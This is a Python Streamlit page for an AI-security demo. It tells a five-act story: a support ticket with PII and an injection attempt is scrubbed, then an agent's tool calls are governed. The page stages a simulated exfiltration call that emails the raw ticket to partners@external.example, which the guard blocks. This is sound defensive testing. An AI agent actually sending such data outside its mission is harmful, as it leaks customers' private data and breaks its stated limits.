"""Animated 5-act end-to-end journey."""

from __future__ import annotations

from pathlib import Path

import streamlit as st

from components.cards import section_header
from components.timeline import act_timeline, event_timeline
from ui_backend import evaluate_tool, make_runtime, run_process, sec_dict, tool_args

DEFAULT_TICKET = (
    Path(__file__).resolve().parents[1] / "fixtures" / "support_ticket.txt"
).read_text(encoding="utf-8")


def render() -> None:
    section_header(
        "Journey",
        "End-to-end story",
        "Five acts: scrub the ticket, then leash the agent.",
    )

    if st.button("Play story", type="primary", key="story_run"):
        st.markdown('<div class="asha-scan"><div></div></div>', unsafe_allow_html=True)
        ticket = DEFAULT_TICKET
        cleaned = run_process(ticket, mode="balanced")
        sec = sec_dict(cleaned)

        act_timeline(
            [
                (
                    "Act 1",
                    "Incoming ticket",
                    "A dirty support ticket arrives with PII, secrets, and an injection attempt.",
                ),
                (
                    "Act 2",
                    "ASHA security scan",
                    f"Threat={sec['threat_level']} · safe={sec['safe']} · PII={', '.join(sec['pii']) or 'none'}",
                ),
                (
                    "Act 3",
                    "Prompt optimization",
                    "Tokens compressed and entities masked before any model call.",
                ),
                (
                    "Act 4",
                    "ANCHOR tool governance",
                    "Local report allowed. Email exfil blocked.",
                ),
                (
                    "Act 5",
                    "Secure outcome",
                    "Scrub first, then leash the agent for safer AI operations.",
                ),
            ]
        )

        with st.expander("Act 1: raw ticket", expanded=True):
            st.code(ticket, language="text")
        with st.expander("Act 2/3: after process()", expanded=True):
            st.code(cleaned.output, language="text")

        runtime = make_runtime(warn_policy="strict")
        runtime.initialize_mission(
            "Write a local incident summary. Do not email or upload externally.",
            context={
                "available_tools": [
                    "load_trend_data",
                    "write_trend_report",
                    "send_email",
                ],
                "local_only": True,
            },
        )
        status_ok, _ = evaluate_tool(
            runtime,
            "write_trend_report",
            tool_args(report_content="Incident summary (PII redacted)."),
            raise_on_block=True,
        )
        status_bad, detail = evaluate_tool(
            runtime,
            "send_email",
            tool_args(
                to="partners@external.example",
                subject="ticket dump",
                body=ticket,
            ),
            raise_on_block=True,
        )
        event_timeline(
            [
                (status_ok, "write_trend_report", "On-mission local write"),
                (status_bad, "send_email", detail or "Blocked"),
            ]
        )
        st.success("Story complete: scrub first, then leash the agent.")
